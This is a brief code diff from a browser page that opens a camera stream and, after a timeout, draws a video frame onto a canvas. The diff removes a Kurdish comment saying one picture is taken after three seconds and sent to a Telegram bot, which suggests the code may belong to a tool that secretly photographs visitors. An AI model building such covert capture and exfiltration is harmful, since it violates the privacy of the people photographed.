@@ -51,7 +51,6 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // تنێ وێنەیەک ب تنێ پشتی ٣ چرکان دگرێت و بۆتە ل تەلەگرامێ دەنێرێت
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
